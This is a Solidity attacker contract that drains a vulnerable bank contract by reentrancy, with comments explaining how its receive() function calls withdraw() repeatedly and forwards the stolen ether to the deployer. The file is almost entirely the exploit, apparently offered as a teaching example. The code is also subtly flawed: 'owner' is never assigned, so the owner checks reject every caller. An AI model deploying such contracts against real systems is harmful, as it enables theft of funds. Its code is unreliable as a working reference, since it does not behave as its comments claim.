// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// Interface for a vulnerable bank with necessary functions
interface IBank {
       function deposit() external payable;
       function withdraw() external;
}

contract Attacker {
       
       IBank public target; // State variable holding reference to vulnerable contract
       Attacker public attacker;

       address public owner; // Hacker-deployer

       constructor(address _target) {
              target = IBank(_target); // Assign the deployed contract address to target

       }

       // REENTRANCY ATTACK FUNCTION
       function attack() external payable {
              require(owner == msg.sender, "You are not an owner");
              require(msg.value >= 1 ether, "Send eth"); // Check deposit for attack. If we don't deposit ether, our balance won't be stored in the vulnerable contract and the attack won't work.

              target.deposit{value: msg.value}(); // Deposit for a vulnerable bank
              target.withdraw(); // START ATTACK
       }

       
       // When we call the withdraw() function, since the recipient is a contract, receive() is triggered, which accepts the stolen ether and calls withdraw() again until the vulnerable bank's balance becomes 0.
       // Because of this recursion, the bank contract doesn't have time to reset the hacker's balance value, and we keep withdrawing money again and again
       receive() external payable {
              if (address(target).balance >= 1 ether) {
                     target.withdraw();
              }
       }

       // The hacker withdraws money from this contract to his own account
       function withdrawAll() external {
              require(owner == msg.sender, "You are not an owner");
              (bool success, ) = address(owner).call{value: address(this).balance}("");
              require(success, "Transfer failed");
       }

}